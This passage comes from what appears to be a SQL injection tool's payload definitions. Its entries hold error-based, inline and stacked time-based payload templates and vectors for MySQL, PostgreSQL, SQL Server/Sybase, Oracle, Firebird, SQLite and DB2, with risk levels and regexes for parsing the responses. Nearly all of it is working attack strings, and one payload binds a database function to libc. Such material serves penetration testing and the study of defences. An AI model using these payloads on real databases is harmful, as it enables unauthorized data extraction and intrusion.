'clause': [1, 2, 3], 'level': 3, 'request': {'payload': "(EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')))"}, 'vector': "(EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')))", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.1'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': "(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1]))"}, 'vector': "(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1]))", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.1'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.5 error-based - Parameter replace (EXP)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': "EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))"}, 'vector': "EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.5'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': "(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"}, 'vector': "(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.5'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'PostgreSQL error-based - Parameter replace', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': "(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))"}, 'vector': "(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))", 'details': {'dbms': 'PostgreSQL'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': "(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))"}, 'vector': "(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))", 'details': {'dbms': 'PostgreSQL'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase error-based - Parameter replace', 'clause': [1, 3], 'level': 3, 'request': {'payload': "(CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))"}, 'vector': "(CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))", 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)', 'clause': [1, 3], 'level': 4, 'request': {'payload': "(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')"}, 'vector': "(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')", 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'Oracle error-based - Parameter replace', 'clause': [1, 3], 'level': 3, 'request': {'payload': "(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"}, 'vector': "(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)", 'details': {'dbms': 'Oracle'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'Firebird error-based - Parameter replace', 'clause': [1, 3], 'level': 4, 'request': {'payload': "(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))"}, 'vector': "(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))", 'details': {'dbms': 'Firebird'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause', 'clause': [2, 3], 'level': 3, 'request': {'payload': ",(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"}, 'vector': ",(SELECT 1 FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)', 'clause': [2, 3], 'level': 4, 'request': {'payload': ",EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))"}, 'vector': ",EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.1'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)', 'clause': [2, 3], 'level': 5, 'request': {'payload': ",UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])"}, 'vector': ",UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.1'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)', 'clause': [2, 3], 'level': 5, 'request': {'payload': ",EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))"}, 'vector': ",EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.5'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)', 'clause': [2, 3], 'level': 5, 'request': {'payload': ",(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"}, 'vector': ",(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.5'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause', 'clause': [2, 3], 'level': 2, 'request': {'payload': ",ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)"}, 'vector': ",ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 4.1'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'PostgreSQL error-based - ORDER BY, GROUP BY clause', 'clause': [2, 3], 'level': 3, 'request': {'payload': ",(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))"}, 'vector': ",(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))", 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)', 'clause': [2, 3], 'level': 5, 'request': {'payload': ",(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))"}, 'vector': ",(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))", 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase error-based - ORDER BY clause', 'clause': [3], 'level': 4, 'request': {'payload': ",(CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))"}, 'vector': ",(CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))", 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'Oracle error-based - ORDER BY, GROUP BY clause', 'clause': [2, 3], 'level': 4, 'request': {'payload': ",(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"}, 'vector': ",(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)", 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'Firebird error-based - ORDER BY clause', 'clause': [2, 3], 'level': 5, 'request': {'payload': ",(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))"}, 'vector': ",(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))", 'details': {'dbms': 'Firebird'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL inline queries', 'clause': [1, 2, 3, 8], 'level': 1, 'request': {'payload': "(SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))"}, 'vector': "(SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))", 'details': {'dbms': 'MySQL'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 3}, {'risk': 1, 'title': 'PostgreSQL inline queries', 'clause': [1, 2, 3, 8], 'level': 1, 'request': {'payload': "(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]')"}, 'vector': "(SELECT '[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]')", 'details': {'dbms': 'PostgreSQL'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 3}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase inline queries', 'clause': [1, 2, 3, 8], 'level': 1, 'request': {'payload': "(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')"}, 'vector': "(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')", 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 3}, {'risk': 1, 'title': 'Oracle inline queries', 'clause': [1, 2, 3, 8], 'level': 2, 'request': {'payload': "(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]' FROM DUAL)"}, 'vector': "(SELECT ('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]') FROM DUAL)", 'details': {'dbms': 'Oracle'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 3}, {'risk': 1, 'title': 'SQLite inline queries', 'clause': [1, 2, 3, 8], 'level': 3, 'request': {'payload': "SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))||'[DELIMITER_STOP]'"}, 'vector': "SELECT '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'", 'details': {'dbms': 'SQLite'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 3}, {'risk': 1, 'title': 'Firebird inline queries', 'clause': [1, 2, 3, 8], 'level': 3, 'request': {'payload': "SELECT '[DELIMITER_START]'||(CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END)||'[DELIMITER_STOP]' FROM RDB$DATABASE"}, 'vector': "SELECT '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' FROM RDB$DATABASE", 'details': {'dbms': 'Firebird'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 3}, {'risk': 1, 'title': 'MySQL > 5.0.11 stacked queries (SELECT - comment)', 'clause': [0], 'level': 1, 'request': {'comment': '#', 'payload': ';(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])'}, 'vector': ';(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])', 'details': {'dbms': 'MySQL', 'dbms_version': '> 5.0.11'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 1, 'title': 'MySQL > 5.0.11 stacked queries (SELECT)', 'clause': [0], 'level': 2, 'request': {'payload': ';(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])'}, 'vector': ';(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])', 'details': {'dbms': 'MySQL', 'dbms_version': '> 5.0.11'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 1, 'title': 'MySQL > 5.0.11 stacked queries (comment)', 'clause': [0], 'level': 2, 'request': {'comment': '#', 'payload': ';SELECT SLEEP([SLEEPTIME])'}, 'vector': ';SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])', 'details': {'dbms': 'MySQL', 'dbms_version': '> 5.0.11'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 1, 'title': 'MySQL > 5.0.11 stacked queries', 'clause': [0], 'level': 3, 'request': {'payload': ';SELECT SLEEP([SLEEPTIME])'}, 'vector': ';SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])', 'details': {'dbms': 'MySQL', 'dbms_version': '> 5.0.11'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 2, 'title': 'MySQL < 5.0.12 stacked queries (heavy query - comment)', 'clause': [0], 'level': 2, 'request': {'comment': '#', 'payload': ";SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))"}, 'vector': ";SELECT IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 4}, {'risk': 2, 'title': 'MySQL < 5.0.12 stacked queries (heavy query)', 'clause': [0], 'level': 4, 'request': {'payload': ";SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))"}, 'vector': ";SELECT IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 4}, {'risk': 1, 'title': 'PostgreSQL > 8.1 stacked queries (comment)', 'clause': [0], 'level': 1, 'request': {'comment': '--', 'payload': ';SELECT PG_SLEEP([SLEEPTIME])'}, 'vector': ';SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL', 'dbms_version': '> 8.1'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 1, 'title': 'PostgreSQL > 8.1 stacked queries', 'clause': [0], 'level': 4, 'request': {'payload': ';SELECT PG_SLEEP([SLEEPTIME])'}, 'vector': ';SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL', 'dbms_version': '> 8.1'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 2, 'title': 'PostgreSQL stacked queries (heavy query - comment)', 'clause': [0], 'level': 2, 'request': {'comment': '--', 'payload': ';SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)'}, 'vector': ';SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 4}, {'risk': 2, 'title': 'PostgreSQL stacked queries (heavy query)', 'clause': [0], 'level': 5, 'request': {'payload': ';SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)'}, 'vector': ';SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 4}, {'risk': 1, 'title': 'PostgreSQL < 8.2 stacked queries (Glibc - comment)', 'clause': [0], 'level': 3, 'request': {'comment': '--', 'payload': ";CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])"}, 'vector': ';SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL', 'os': 'Linux', 'dbms_version': '< 8.2'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 1, 'title': 'PostgreSQL < 8.2 stacked queries (Glibc)', 'clause': [0], 'level': 5, 'request': {'payload': ";CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])"}, 'vector': ';SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL', 'os': 'Linux', 'dbms_version': '< 8.2'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase stacked queries (comment)', 'clause': [0], 'level': 1, 'request': {'comment': '--', 'payload': ";WAITFOR DELAY '0:0:[SLEEPTIME]'"}, 'vector': ";IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'", 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase stacked queries', 'clause': [0], 'level': 4, 'request': {'payload': ";WAITFOR DELAY '0:0:[SLEEPTIME]'"}, 'vector': ";IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'", 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 1, 'title': 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)', 'clause': [0], 'level': 1, 'request': {'comment': '--', 'payload': ";SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL"}, 'vector': ";SELECT CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END FROM DUAL", 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 1, 'title': 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)', 'clause': [0], 'level': 4, 'request': {'payload': ";SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL"}, 'vector': ";SELECT CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END FROM DUAL", 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 2, 'title': 'Oracle stacked queries (heavy query - comment)', 'clause': [0], 'level': 2, 'request': {'comment': '--', 'payload': ';SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5'}, 'vector': ';SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END FROM DUAL', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 4}, {'risk': 2, 'title': 'Oracle stacked queries (heavy query)', 'clause': [0], 'level': 5, 'request': {'payload': ';SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5'}, 'vector': ';SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END FROM DUAL', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 4}, {'risk': 1, 'title': 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)', 'clause': [0], 'level': 4, 'request': {'comment': '--', 'payload': ';BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END'}, 'vector': ';BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 1, 'title': 'Oracle stacked queries (DBMS_LOCK.SLEEP)', 'clause': [0], 'level': 5, 'request': {'payload': ';BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END'}, 'vector': ';BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 1, 'title': 'Oracle stacked queries (USER_LOCK.SLEEP - comment)', 'clause': [0], 'level': 5, 'request': {'comment': '--', 'payload': ';BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END'}, 'vector': ';BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 1, 'title': 'Oracle stacked queries (USER_LOCK.SLEEP)', 'clause': [0], 'level': 5, 'request': {'payload': ';BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END'}, 'vector': ';BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 2, 'title': 'IBM DB2 stacked queries (heavy query - comment)', 'clause': [1, 2, 3], 'level': 3, 'request': {'comment': '--', 'payload': ';SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3'}, 'vector': ';SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE])', 'details': {'dbms': 'IBM DB2'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'IBM DB2 stacked queries (heavy query)', 'clause': [1, 2, 3], 'level': 5, 'request': 